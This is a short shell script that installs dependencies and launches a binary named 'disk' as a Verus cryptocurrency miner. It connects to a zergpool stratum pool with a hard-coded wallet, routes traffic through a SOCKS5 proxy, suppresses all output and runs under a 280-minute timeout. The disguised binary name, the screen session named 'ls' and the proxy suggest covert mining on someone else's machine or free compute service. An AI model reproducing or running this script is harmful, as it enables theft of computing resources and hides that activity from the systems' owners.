#!/bin/sh
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x disk
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr
PROXY=socks5://192.252.209.155:14455
WORKER=$(echo $(shuf -i 100-999 -n 1)-HERMAN-DENOK)
timeout 280m ./disk -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
echo Sukses
